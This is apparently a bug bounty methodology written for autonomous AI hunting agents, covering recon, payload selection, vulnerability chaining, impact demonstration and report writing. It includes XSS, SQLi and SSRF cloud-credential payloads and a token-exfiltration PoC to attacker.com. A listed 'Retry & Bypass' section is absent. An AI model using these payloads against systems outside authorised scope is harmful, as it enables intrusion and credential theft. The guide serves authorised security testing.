# Autonomous Bug Bounty Hunting Methodology

> **Document Version**: 2025.1 | **Classification**: Internal Reference | **Audience**: AI Hunting Agents
>
> This methodology provides a systematic, repeatable framework for autonomous bug bounty hunting. Each phase includes decision trees, tool commands, and validation checkpoints.

---

## Table of Contents

1. [Reconnaissance Phase](#1-reconnaissance-phase)
2. [Vulnerability Discovery Phase](#2-vulnerability-discovery-phase)
3. [Impact Validation Phase](#3-impact-validation-phase)
4. [Report & Delivery Phase](#4-report--delivery-phase)
5. [Retry & Bypass Strategies](#5-retry--bypass-strategies)

---

## 1. Reconnaissance Phase

> **Goal**: Map the entire attack surface before touching any interactive endpoint. Reconnaissance determines 80% of hunt success.

### 1.1 Subdomain Enumeration Strategies

#### Passive Enumeration (No DNS queries sent to target)

```bash
# Certificate Transparency Logs
curl -s "https://crt.sh/?q=%.{DOMAIN}&output=json" | jq -r '.[].name_value' | sort -u

# Subfinder - passive sources only
subfinder -d {DOMAIN} -all -passive -o subs_passive.txt

# Amass passive (intel mode)
amass intel -d {DOMAIN} -whois -src

# Chaos (ProjectDiscovery)
chaos -d {DOMAIN} -silent -key $CHAOS_KEY

# Shodan subdomains
shodan search "ssl.cert.subject.cn:*.{DOMAIN}" --fields hostnames

# Censys certificate search
censys search "parsed.names: {DOMAIN}" --index-type certificates

# Anubis, ThreatCrowd, URLScan passive
curl -s "https://jldc.me/anubis/subdomains/{DOMAIN}" | jq -r '.[]'
curl -s "https://threatcrowd.org/searchApi/v2/domain/report/?domain={DOMAIN}" | jq -r '.subdomains[]'
curl -s "https://urlscan.io/api/v1/search/?q=domain:{DOMAIN}&size=10000" | jq -r '.results[].page.domain'

# GitHub dorking for subdomains
github-subdomains -d {DOMAIN} -t $GITHUB_TOKEN -o subs_github.txt

# Archive.org historical
curl -s "http://web.archive.org/cdx/search/cdx?url=*.{DOMAIN}/*&output=json&fl=original&collapse=urlkey" | jq -r '.[1:][][0]'
```

**AI Agent Checklist - Passive Recon:**
- [ ] Query all certificate transparency logs (crt.sh, Censys, Facebook CT)
- [ ] Run subfinder with -all flag
- [ ] Check Amass intel for ASN and WHOIS correlation
- [ ] Query Shodan/Censys for exposed hosts
- [ ] GitHub dork for exposed subdomains and API keys
- [ ] Search Wayback Machine for historical URLs
- [ ] Check BufferOver.run and DNSDumpster
- [ ] Review security trails historical DNS data

#### Active Enumeration (DNS queries sent)

```bash
# DNS bruteforce with dnsx (using wordlist)
dnsx -d {DOMAIN} -w /usr/share/seclists/Discovery/DNS/subdomains-top2million-110000.txt -o subs_dnsx.txt

# Pure brute force with massdns (fast but noisy)
massdns -r /usr/share/seclists/Discovery/DNS/resolvers.txt -t A -o S -w massdns_out.txt /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# puredns (combines wordlist + resolution)
puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top2million-20000.txt {DOMAIN} --resolvers resolvers.txt -w subs_brute.txt

# Shuffledns
shuffledns -d {DOMAIN} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r resolvers.txt -o subs_shuffle.txt
```

#### Permutation/Alteration Techniques

```bash
# DNSGen - generate permutations from discovered subs
cat subs_found.txt | dnsgen -w words.txt - | sort -u | dnsx -silent

# AltDNS permutation
altdns -i subs_found.txt -o subs_perm.txt -w /usr/share/seclists/Discovery/DNS/alt-dns-words.txt

# Gotator (advanced permutation engine)
gotator -sub subs_found.txt -perm permutations.txt -depth 2 -numbers 5 -md -silent

# Commonly missed patterns:
# - env/ environment/ env-{env}
# - staging/ stage/ stg/ staging-{env}
# - dev/ devel/ development/ dev-{name}
# - api/ api-v1/ api-v2/ internal-api/ api-staging
# - admin/ administrator/ manage/ management/ portal-admin
# - git/ github/ gitlab/ bitbucket/ source/ repo
# - jenkins/ ci/ cd/ build/ deploy
# - kibana/ elastic/ es/ search/ logs/ monitoring
# - grafana/ prometheus/ metrics/ graphite/ zabbix
# - db/ database/ mysql/ postgres/ redis/ mongo
# - vpn/ openvpn/ wireguard/ remote/ access
# - ftp/ sftp/ upload/ files/ assets-cdn
# - old/ legacy/ v1/ v2/ backup/ archive
# - mobile/ m/ app/ ios/ android/ api-mobile
# - partners/ affiliate/ reseller/ vendor/ supplier
# - webmail/ mail/ exchange/ outlook/ smtp/ imap
# - support/ helpdesk/ zendesk/ freshdesk/ tickets
# - test/ testing/ qa/ uat/ sandbox/ demo
```

#### VHost Discovery (Virtual Host Brute-forcing)

```bash
# ffuf vhost discovery
ffuf -u http://{IP}/ -H "Host: FUZZ.{DOMAIN}" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0 -mc all -o vhosts.json

# gobuster vhost
gobuster vhost -u http://{IP}/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --append-domain

# Aquatone (screenshot + tech fingerprinting)
cat subs_all.txt | aquatone -ports xlarge -out aquatone/
```

### 1.2 Technology Fingerprinting and Stack Identification

#### Comprehensive Stack Enumeration

```bash
# Wappalyzer CLI
wappalyzer {URL} --pretty

# WebTech (Python)
webtech -u {URL}

# WhatWeb (aggressive)
whatweb -a 3 {URL} --log-json=whatweb.json

# BuiltWith API
curl -s "https://api.builtwith.com/v19/api.json?KEY=$BUILTWITH_KEY&LOOKUP={DOMAIN}"

# Nmap service detection (targeted)
nmap -sV --version-intensity 9 -p 80,443,8080,8443 {IP}

# nuclei - tech detection templates
nuclei -u {URL} -t http/technologies/ -o tech_detection.txt

# Nuclei tags for specific tech
nuclei -u {URL} -tags aws,google,github,jenkins,confluence,gitlab
```

**Priority Technology Targets for Bug Bounty:**

| Technology | Priority | Common Vuln Classes |
|------------|----------|-------------------|
| WordPress | High | SQLi, RCE, Auth bypass, Plugin vulns |
| Drupal | High | SA-CORE (RCE, SQLi), Module vulns |
| Joomla | Medium | RCE, SQLi, Auth bypass |
| Laravel | High | Debug mode RCE, .env exposure, SQLi |
| Django | High | Debug mode, Pickle deserialization |
| Ruby on Rails | High | RCE (CVE-2019-5418), Mass assignment |
| Express/Node.js | High | Prototype pollution, SSTI, XXE |
| ASP.NET | Medium | ViewState RCE, SQLi, Deserialization |
| GraphQL | Critical | Introspection, Batching, Depth limit |
| Elasticsearch | High | RCE (CVE-2015-1427), Data exfiltration |
| Redis | High | Unauthorized access, RCE via modules |
| MongoDB | Medium | NoSQL injection, Unauthorized access |
| Jenkins | Critical | RCE, Script console, Groovy execution |
| GitLab | Critical | RCE (CVE-2021-22205), SSRF |
| Confluence | Critical | RCE (CVE-2021-26084, CVE-2022-26134) |
| Apache Struts | Critical | OGNL RCE (CVE-2017-5638) |
| ColdFusion | High | Deserialization, Path traversal |
| Spring Boot | High | Actuator exposure, SpEL injection |

#### JavaScript Framework Analysis

```bash
# Extract and analyze JS files
katana -u {URL} -jc -o js_files.txt

# LinkFinder - extract endpoints from JS
python3 linkfinder.py -i {URL} -o cli

# SecretFinder - find secrets in JS
python3 secretfinder.py -i {URL} -o cli

# Manually analyze webpack sources
# Look for: source maps (*.js.map), API endpoints, hardcoded keys
# Check: webpack:// in DevTools Sources panel

# nuclei JS secret detection
nuclei -u {URL} -t http/exposures/configs/ -t file/keys/

# Retire.js - known vulnerable JS libraries
retire --js --path {URL}
```

### 1.3 Endpoint Discovery

#### JavaScript Analysis Pipeline

```bash
# Step 1: Crawl and collect all JS files
katana -u {URL} -jc -d 5 -o all_js_files.txt

# Step 2: Download and analyze JS
mkdir js_analysis && cd js_analysis
cat all_js_files.txt | xargs -I {} wget -q {}

# Step 3: Extract API endpoints
grep -rhoP '(https?://|/)[a-zA-Z0-9_/-]+(?:v\d+)?[a-zA-Z0-9_/-]*' *.js | sort -u > js_endpoints.txt

# Step 4: Extract GraphQL endpoints
grep -roi 'graphql[/a-zA-Z0-9_-]*' *.js | sort -u

# Step 5: Look for API base URLs and patterns
grep -roiP '(api|rest|graphql|v1|v2|internal|admin)[._/][a-zA-Z0-9_-]+' *.js | sort -u

# Step 6: Extract potential secrets
grep -roiP '(api[_-]?key|token|secret|password|auth)\s*[:=]\s*["\047][a-zA-Z0-9_-]+' *.js

# Step 7: Source map recovery
curl -s {JS_URL}.map | python3 -m json.tool | grep -oP '"sources":\[.*?\]' | head -1
```

**AI Agent JS Analysis Checklist:**
- [ ] Identify frontend framework (React, Vue, Angular, Svelte)
- [ ] Map all API endpoint patterns
- [ ] Find GraphQL queries and mutations
- [ ] Extract hardcoded credentials, API keys, tokens
- [ ] Discover WebSocket endpoint URLs
- [ ] Find upload endpoints and file handling logic
- [ ] Identify authentication flow implementation
- [ ] Look for debug/dev mode flags
- [ ] Find CORS configuration in JS
- [ ] Discover WebRTC, Service Worker, Push notification endpoints

#### API Documentation Discovery

```bash
# Common API doc paths
/api
/api-docs
/api/docs
/swagger
/swagger-ui.html
/swagger.json
/v2/api-docs
/openapi.json
/openapi.yaml
/graphql
/graphiql
/altair
/playground
/redoc
/postman/collections
/soap
/wsdl
/.well-known/openapi
/_api
/internal/api
```

```bash
# Automated API doc discovery
ffuf -u {URL}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt -mc 200,301 -o api_docs.json

# Check for GraphQL introspection
curl -s -X POST {URL}/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}'

# Check for SOAP/WSDL
curl -s {URL}/service?wsdl | head -50
```

#### Comprehensive Wordlist Fuzzing

```bash
# Directory discovery with ffuf
ffuf -u {URL}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -e .php,.asp,.aspx,.jsp,.html,.txt,.json,.xml,.bak -t 100 -o dirs.json

# File discovery
ffuf -u {URL}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100 -o files.json

# Parameter discovery (GET)
ffuf -u {URL}/page.php?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -o params_get.json

# Parameter discovery (POST)
ffuf -u {URL}/page.php -X POST -d "FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -o params_post.json

# Custom parameter wordlist based on context
cat << 'EOF' > custom_params.txt
id
user_id
account_id
org_id
tenant_id
role
type
format
redirect
return_url
callback
next
action
cmd
exec
command
run
file
path
filename
dir
location
url
uri
link
src
dest
target
host
ip
port
input
data
content
body
xml
json
query
search
q
filter
sort
order
limit
offset
page
per_page
version
api_key
token
auth
session
password
email
username
name
description
EOF
```

### 1.4 Parameter Discovery and Surface Mapping

#### Automated Parameter Mining

```bash
# Arjun - HTTP parameter discovery
arjun -u {URL}/endpoint -m GET -oT 20
arjun -u {URL}/endpoint -m POST -oT 20
arjun -u {URL}/endpoint -m JSON -oT 20

# x8 - hidden parameter discovery
x8 -u "{URL}/page" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# Commix - command injection parameter testing
python3 commix.py -u "{URL}/page?param=value" --level=3

# ParamSpider - parameter extraction from web archive
python3 paramspider.py --domain {DOMAIN} --level high --output paramspider.txt

# WaybackURLs with parameters
cat subs_all.txt | waybackurls | grep "?" | sort -u > wayback_params.txt

# Gau + unfurl for parameter analysis
cat subs_all.txt | gau --providers wayback,otx,commoncrawl | unfurl --unique keys
```

**Hidden Parameter Categories to Test:**

| Category | Example Parameters | Test Values |
|----------|-------------------|-------------|
| Debug | `debug`, `dev`, `test`, `sandbox` | `true`, `1`, `yes` |
| Format | `format`, `output`, `type`, `content-type` | `json`, `xml`, `yaml`, `text` |
| Role | `role`, `is_admin`, `admin`, `privilege` | `true`, `admin`, `1` |
| Redirect | `redirect`, `return_to`, `next`, `url` | `//evil.com`, `https://evil.com` |
| Action | `action`, `cmd`, `do`, `execute` | `delete`, `update`, `run` |
| Internal | `internal`, `preview`, `draft`, `raw` | `true`, `1`, `yes` |
| Pagination | `limit`, `offset`, `page`, `per_page` | `99999`, `-1`, `0` |
| Version | `version`, `v`, `api_version` | `../`, `latest`, `~` |

### 1.5 Authentication Flow Mapping

#### Complete Auth Flow Reconstruction

```bash
# Step 1: Identify all authentication entry points
# - Login form (username/password)
# - OAuth/OIDC providers (Google, GitHub, Facebook, etc.)
# - SAML SSO
# - API key authentication
# - JWT token authentication
# - Session cookie authentication
# - Basic/Digest authentication
# - MFA/2FA flows

# Step 2: Map the complete authentication state machine
# Tools: Burp Suite, OWASP ZAP, or manual curl testing

# Login flow testing
curl -s -D - -X POST "{URL}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}' -o login_flow.txt

# OAuth flow analysis
curl -s -L "{URL}/oauth/authorize?client_id=CLIENT&redirect_uri=URI&response_type=code&scope=profile" -D oauth_flow.txt

# Check for password reset flow
curl -s -X POST "{URL}/api/password-reset" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com"}'

# Check for registration flow
curl -s -X POST "{URL}/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"Test123!","email":"test@example.com"}'
```

**Authentication Flow Analysis Checklist:**
- [ ] Map all login endpoints and methods
- [ ] Document complete OAuth/OIDC flow (authorization code, implicit, PKCE)
- [ ] Test for authentication bypass on each endpoint
- [ ] Analyze session creation, validation, and destruction
- [ ] Test password reset flow for token prediction, reuse, host header injection
- [ ] Test registration for duplicate account creation, role escalation
- [ ] Map MFA implementation and test bypass vectors
- [ ] Analyze JWT if used (algorithm, key ID, expiration, claims)
- [ ] Test session fixation and hijacking resistance
- [ ] Check for concurrent session handling
- [ ] Verify logout properly invalidates session server-side

---

## 2. Vulnerability Discovery Phase

> **Goal**: Systematically test every discovered endpoint for vulnerability classes prioritized by program scope and technology stack.

### 2.1 Systematic Testing Approach by Bug Class

#### Testing Priority Matrix

| Priority | Bug Class | When to Test First |
|----------|-----------|-------------------|
| P0 | IDOR / Authorization | Any authenticated endpoint with user-controlled IDs |
| P0 | XSS | Any input reflected in response, any user content display |
| P0 | SQLi / NoSQLi | Any technology with database interaction |
| P1 | SSRF | Any URL/URI parameter, file upload, webhook |
| P1 | Authentication Bypass | All auth endpoints, OAuth, JWT, Session |
| P1 | CSRF / CORS | Any state-changing endpoint, cross-origin requests |
| P2 | XXE | Any XML parsing endpoint |
| P2 | Command Injection | Any system/utility features, file processing |
| P2 | File Upload / Path Traversal | Any file upload, download, path parameter |
| P3 | Prototype Pollution | Node.js/Python/Ruby apps, JSON input |
| P3 | Business Logic | Payment, coupon, limit-based features |
| P3 | Race Conditions | Singleton resources, limit enforcement |

#### Endpoint Testing Workflow

```
For each discovered endpoint:
  1. Identify HTTP methods (GET, POST, PUT, DELETE, PATCH, OPTIONS)
  2. Identify all parameters (URL, body, headers, cookies)
  3. Determine data format (JSON, XML, form-data, multipart)
  4. Determine authentication requirements
  5. Test for IDOR (swap IDs between accounts)
  6. Test for XSS (inject payloads in all parameters)
  7. Test for SQLi (inject payloads in all parameters)
  8. Test for SSRF (supply internal URLs)
  9. Test for command injection (metacharacter injection)
  10. Test for XXE (if XML is accepted)
  11. Test for file upload vulnerabilities
  12. Test for CORS misconfigurations
  13. Test for authentication/authorization bypass
  14. Test rate limiting and brute force protection
  15. Test business logic edge cases
```

### 2.2 Context-Aware Payload Selection

#### XSS Context Detection and Payload Selection

```javascript
// HTML Context (output inside HTML body)
// Detection: <xss_test>
// Payloads:
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>

// Attribute Context (output inside HTML attribute)
// Detection: " xss_test
// Payloads:
" onfocus=alert(document.domain) autofocus x="
" onmouseover=alert(document.domain) x="
" autofocus onfocus=alert(document.domain) x="

// JavaScript Context (output inside <script> tag)
// Detection: ';alert('xss');//
// Payloads:
';alert(document.domain)//!
'-alert(document.domain)-'
\x3balert(document.domain)//

// URL Context (output inside href/src)
// Detection: javascript:alert('xss')
// Payloads:
javascript:alert(document.domain)
data:text/html,<script>alert(document.domain)</script>

// CSS Context (output inside style attribute)
// Detection: }body{xss:test;}
// Payloads:
}</style><script>alert(document.domain)</script><style>
expression(alert(document.domain))

// Template Context (Angular, Vue, etc.)
// Detection: {{7*7}}
// Payloads:
{{constructor.constructor('alert(document.domain)')()}}
{{_openBlock.constructor('alert(document.domain)')()}}
${alert(document.domain)}
```

#### SQLi Context Detection

```sql
-- Numeric parameter context
?id=1 AND 1=1 -- TRUE
?id=1 AND 1=2 -- FALSE
?id=1-1 -- If result changes, injectable

-- String parameter context
?name=test' AND '1'='1 -- TRUE
?name=test' AND '1'='2 -- FALSE
?name=test'||' -- Concatenation test

-- Comment styles for different databases
-- MySQL: #, -- , /* */
-- PostgreSQL: --, /* */
-- MSSQL: --, /* */
-- Oracle: --, /* */
-- SQLite: --, /* */

-- Database fingerprinting
?id=1 AND 1=1 -- (universal true)
?id=1 AND LENGTH('a')=1 -- MySQL/PostgreSQL
?id=1 AND LEN('a')=1 -- MSSQL
?id=1 AND 'a'||'b'='ab' -- Oracle/PostgreSQL
?id=1 AND CONCAT('a','b')='ab' -- MySQL
?id=1 AND @@version -- MSSQL
?id=1 AND version() -- PostgreSQL/MySQL
```

### 2.3 Chain-Based Vulnerability Exploration

#### Vulnerability Chaining Decision Tree

```
Initial Finding
    |
    v
Can it be combined with XSS? --YES--> Stored XSS + CSRF --> Account Takeover
    |                                          |
    NO                                         v
    |                                    Can it be chained with
    v                                    SSRF? --> Internal API Access
Can it be combined with SSRF?
    |
    +--YES--> SSRF + Cloud Metadata --> AWS Keys --> RCE
    |                                          |
    NO                                         v
    |                                    Can it be chained with
    v                                    Privilege Escalation?
Can it be combined with Auth Bypass?
    |
    +--YES--> Auth Bypass + IDOR --> Data Exfiltration
    |                                          |
    NO                                         v
    |                                    Cross-Tenant Access?
    v
Information Disclosure --> Bug Class Specific Chain
    |
    v
Stack Trace / Error Message --> Framework Version
    --> Known CVE --> Exploit --> RCE
```

#### Common High-Impact Chains

```
1. Reflected XSS + OAuth Redirect URI = Account Takeover
   - Steal OAuth authorization code via XSS
   - Exchange code for access token
   - Full account takeover

2. Blind SSRF + Internal API = Data Exfiltration
   - SSRF to internal metadata service
   - Extract service credentials
   - Access internal APIs with stolen creds

3. IDOR + Mass Assignment = Admin Account Creation
   - Find IDOR in user update endpoint
   - Add admin/role parameter via mass assignment
   - Create admin account

4. Prototype Pollution + Gadget = RCE
   - Pollute Object.prototype
   - Trigger gadget in template engine
   - Achieve remote code execution

5. XXE + File Read = Private Key Extraction
   - XXE to read local files
   - Extract SSH private keys or app secrets
   - Pivot to other systems

6. CORS Misconfiguration + XSS = API Key Theft
   - Misconfigured CORS allows evil origin
   - XSS on allowed origin
   - Steal API keys/tokens via fetch()
```

### 2.4 Business Logic Analysis Patterns

#### Business Logic Testing Methodology

```bash
# Step 1: Understand the business model
# - What does the application do?
# - What are the user roles and permissions?
# - What are the valuable assets?
# - What are the trust boundaries?

# Step 2: Map the workflow
# - User registration flow
# - Purchase/checkout flow
# - Content creation/moderation flow
# - Admin/management flow
# - API integration flow

# Step 3: Identify trust assumptions
# - What does the app assume users won't do?
# - What validations are client-side only?
# - What values are assumed to be positive/incrementing?

# Step 4: Test boundary conditions
# - Negative quantities
# - Zero values
# - Maximum integer values (2147483647)
# - Decimal/fractional values where integers expected
# - Unicode/emoji in structured fields
# - Time-based edge cases (expired, future dates)
```

**Business Logic Test Cases:**

| Feature | Test Case | Expected Behavior | Bug Indicator |
|---------|-----------|-------------------|---------------|
| Shopping Cart | Add negative quantity | Error/rejection | Price reduction/refund |
| Shopping Cart | Add item, change price client-side | Error/rejection | Price manipulation |
| Checkout | Remove item after payment step | Error/rejection | Free item delivery |
| Coupon | Apply same coupon multiple times | One-time use | Multiple discounts |
| Subscription | Cancel after using premium features | Pro-rated refund | Free premium access |
| API Rate Limit | Send requests in parallel burst | Rate limited | Some requests bypass limit |
| Multi-step Form | Skip step via direct URL access | Redirect to correct step | Process incomplete data |
| File Upload | Upload .php.txt or double extension | Validate extension | Code execution |
| Password Reset | Reuse reset token | Token invalidated | Second reset succeeds |

### 2.5 Race Condition Testing Methodology

#### Race Condition Detection Strategy

```bash
# Tool: racepwn or custom Python script
# Principle: Send multiple simultaneous requests to exploit
# check-then-act or read-then-write race windows

# Test Case 1: Coupon Multiple Use
# Send 10 simultaneous requests using same one-time coupon
cat << 'EOF' > race_coupon.py
import asyncio
import aiohttp

async def use_coupon(session, url, coupon_code):
    async with session.post(url, json={"coupon": coupon_code, "order_id": "12345"}) as resp:
        return await resp.json()

async def main():
    url = "https://target.com/api/apply-coupon"
    coupon = "ONCE-ONLY-COUPON"
    async with aiohttp.ClientSession() as session:
        tasks = [use_coupon(session, url, coupon) for _ in range(10)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            print(r)

asyncio.run(main())
EOF

# Test Case 2: Limit Bypass (e.g., API rate credits)
# Send burst of requests at credit limit boundary

# Test Case 3: Balance Manipulation
# Simultaneous withdrawal requests from same balance

# Test Case 4: Unique Constraint Bypass
# Simultaneous registration with same username/email

# Test Case 5: OTP Brute Force Race
# Multiple simultaneous OTP verification attempts
```

**Race Condition Indicators:**
- Operations that read then write (check-then-act)
- Numeric limits that decrement on use
- Unique constraints enforced at application level
- Balance/credit calculations
- Inventory management
- One-time token redemption

---

## 3. Impact Validation Phase

> **Goal**: Transform a vulnerability detection into a demonstrated security impact that justifies reward.

### 3.1 Escalating from Detection to Demonstrated Impact

#### Impact Escalation Framework

```
Level 1: Detection (Vulnerability exists)
    |
    +--> Confirmed the vulnerability triggers
    |
    v
Level 2: Basic Demonstration (Show it works)
    |
    +--> Demonstrate with benign payload (alert(1), sleep(5))
    +--> Show data exposure (version(), current_user())
    |
    v
Level 3: Real Impact (Show it's dangerous)
    |
    +--> XSS: Cookie theft demo, keylogging demo
    +--> SQLi: Extract 1 real row of non-sensitive data
    +--> SSRF: Access internal service, cloud metadata
    +--> IDOR: Access another user's data (with permission)
    |
    v
Level 4: Critical Impact (Maximum demonstrable)
    |
    +--> XSS: Full session hijacking + account takeover
    +--> SQLi: Full database dump capability
    +--> SSRF: Internal network access + cloud creds
    +--> Auth Bypass: Admin access + privilege escalation
    +--> RCE: Shell access / command execution
```

**Impact Demonstration Techniques:**

```javascript
// XSS: Demonstrate cookie theft (use your own session)
fetch('https://your-burp-collaborator.net/?c='+document.cookie)

// XSS: Keylogger demonstration
// (Show in PoC that keystrokes can be captured)

// SQLi: Extract current database user
?id=1 UNION SELECT null,current_user(),null--

// SQLi: Extract version information
?id=1 UNION SELECT null,version(),null--

// SSRF: Access cloud metadata
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

// IDOR: Access test account data (created by you)
/api/user/12345 --> 200 OK (your account)
/api/user/12346 --> 200 OK (test account - demonstrates access)
```

### 3.2 Data Extraction Proof Techniques

#### Safe Data Extraction Demonstrations

```sql
-- SQLi: Extract limited, non-sensitive data
-- Always use LIMIT and avoid sensitive tables

-- PostgreSQL: Get current user (no sensitive data)
UNION SELECT NULL,current_user,NULL--

-- MySQL: Get database version
UNION SELECT NULL,@@version,NULL--

-- MSSQL: Get server name
UNION SELECT NULL,@@SERVERNAME,NULL--

-- Oracle: Get instance name
UNION SELECT NULL,instance_name FROM v$instance--

-- NEVER extract:
-- - Password hashes
-- - Credit card numbers
-- - Personal identifiable information (PII)
-- - Email addresses of real users
-- - Private messages or content
```

```bash
# SSRF: Extract metadata (safe for PoC)
# AWS Metadata (169.254.169.254)
curl "http://169.254.169.254/latest/meta-data/"

# GCP Metadata (metadata.google.internal)
curl "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"

# Azure Metadata (169.254.169.254)
curl "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"
```

### 3.3 Account Takeover Demonstration

#### Account Takeover Proof-of-Concept Protocol

```
Step 1: Create a secondary test account (Account B)
Step 2: Execute the vulnerability using Account A's session
Step 3: Show that Account B's session/token can be obtained
Step 4: Demonstrate login as Account B using stolen credentials
Step 5: NEVER actually hijack another user's account
```

```javascript
// XSS-based Account Takeover PoC
// 1. Attacker crafts malicious link with XSS payload
// 2. Victim (test account B) clicks the link
// 3. XSS executes and exfiltrates session token

// PoC Payload (exfiltrates to attacker's server):
<script>
fetch('https://attacker.com/steal?token='+localStorage.getItem('auth_token'))
</script>

// PoC shows: If a real user clicked this, their token would be stolen
```

```bash
# Password Reset Account Takeover PoC
# 1. Request password reset for test Account B
# 2. Intercept/guess the reset token
# 3. Use token to set new password
# 4. Login with new password

# Token Prediction Test:
# If tokens are sequential or time-based:
# Original: reset?token=abc123def456
# Test:     reset?token=abc123def457
```

### 3.4 Privilege Escalation Chains

#### Privilege Escalation Testing

```bash
# Step 1: Map all user roles
# - Anonymous/Unauthenticated
# - Standard User
# - Premium/Paid User
# - Moderator
# - Admin/Super Admin
# - API/System Account

# Step 2: Map endpoints by role
# For each endpoint, test with each role's credentials

# Step 3: Test vertical escalation
# User -> Admin
# Standard -> Premium

# Step 4: Test horizontal escalation
# User A -> User B's data
# Org A -> Org B's data

# Test: Can user access admin endpoints?
GET /api/admin/users HTTP/1.1
Authorization: Bearer <USER_TOKEN>
# Expected: 403 Forbidden
# Bug:      200 OK with user list

# Test: Can user add admin parameter?
POST /api/user/update HTTP/1.1
Authorization: Bearer <USER_TOKEN>
Content-Type: application/json

{"role": "admin", "is_admin": true}
# Expected: Role parameter ignored
# Bug:      Account promoted to admin
```

### 3.5 Cross-Org / Cross-Tenant Testing

#### Multi-Tenant Application Testing

```bash
# Identify tenant isolation mechanisms:
# - Subdomain (tenant.app.com)
# - Path (app.com/tenant/)
# - Header (X-Tenant-ID: 123)
# - JWT claim (tenant_id: 123)

# Test 1: Can Tenant A access Tenant B's data?
GET /api/documents HTTP/1.1
Host: tenant-a.app.com
Cookie: session=tenant_a_session
# -> Returns Tenant A documents (200)

GET /api/documents HTTP/1.1
Host: tenant-b.app.com
Cookie: session=tenant_a_session
# Expected: 403 Unauthorized
# Bug:      200 OK with Tenant B documents

# Test 2: IDOR across tenants
GET /api/document/12345 HTTP/1.1
Host: tenant-a.app.com
# Document 12345 belongs to Tenant A

GET /api/document/12346 HTTP/1.1
Host: tenant-a.app.com
# Document 12346 belongs to Tenant B
# Expected: 403
# Bug:      200 with Tenant B's document

# Test 3: Header-based tenant switching
GET /api/data HTTP/1.1
X-Tenant-ID: 1
# Belongs to Tenant 1

GET /api/data HTTP/1.1
X-Tenant-ID: 2
# Belongs to Tenant 2
# Expected: 403
# Bug:      200 with Tenant 2's data
```

---

## 4. Report & Delivery Phase

### 4.1 HackerOne Report Structure

```markdown
# Report Template for HackerOne

## Title
[Bug Class] in [Feature/Endpoint] leading to [Impact]

Example: "Stored XSS in comment submission leading to session hijacking"
Example: "IDOR in /api/user/{id} allowing access to any user's data"

## Severity
Select from: None, Low, Medium, High, Critical
Justify with CVSS vector and business impact.

## Summary
2-3 sentence executive summary of the vulnerability and its impact.

Example: "The user profile update endpoint fails to validate that the
provided user_id belongs to the authenticated user. This allows any
authenticated user to update any other user's profile information,
including email address, which can be chained with password reset to
achieve full account takeover."

## Steps to Reproduce
Numbered, exact steps to reproduce the vulnerability.

1. Log in to the application with Account A
2. Navigate to Settings > Profile
3. Intercept the profile update request in a proxy
4. Change the `user_id` parameter from your ID (123) to target ID (124)
5. Observe that the profile for user 124 is updated

## Impact
Clear statement of security and business impact.

- **Security Impact**: Unauthorized modification of user profiles
- **Business Impact**: Account takeover via email change + password reset
- **Affected Users**: All users of the platform
- **Exploitability**: Low complexity, no user interaction required

## Proof of Concept
Include:
- HTTP request/response pairs
- Screenshots showing the vulnerability
- Video demonstration (if required by program)
- Burp/ZAP project files (if requested)

### HTTP Request
```
POST /api/profile/update HTTP/1.1
Host: target.com
Authorization: Bearer eyJ0eXAiOiJKV1Qi...
Content-Type: application/json

{
  "user_id": 124,
  "email": "attacker@evil.com"
}
```

### HTTP Response
```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "message": "Profile updated successfully"
}
```

## Suggested Fix
Specific, actionable remediation advice.

Example: "Implement server-side authorization checks to verify that
 the authenticated user owns the user_id being modified. Use session-stored
 user identifiers rather than client-supplied IDs for database queries."

## Additional Information
- CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
- CVSS Score: 8.1 (High)
- References: CWE-639, OWASP Top 10 2021 A01:2021
- Was this vulnerability previously reported? [Yes/No]
```

### 4.2 CVSS Scoring with Calculator References

#### CVSS 3.1 Scoring Guide

| Metric | Options | Bug Bounty Context |
|--------|---------|-------------------|
| **Attack Vector (AV)** | N/A/L/P | Network (N) for web apps |
| **Attack Complexity (AC)** | L/H | Low if standard exploitation |
| **Privileges Required (PR)** | N/L/H | Context-dependent |
| **User Interaction (UI)** | N/R | Required for reflected XSS |
| **Scope (S)** | U/C | Changed if cross-origin impact |
| **Confidentiality (C)** | N/L/H | Data access level |
| **Integrity (I)** | N/L/H | Data modification level |
| **Availability (A)** | N/L/H | Service disruption level |

**Quick Reference Scores:**

| Vulnerability | CVSS Vector | Score |
|---------------|-------------|-------|
| Stored XSS (no auth) | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N | 9.3 |
| Reflected XSS | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N | 6.1 |
| SQLi (data extraction) | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | 7.5 |
| SQLi (full RCE) | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 |
| IDOR (user data) | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N | 6.5 |
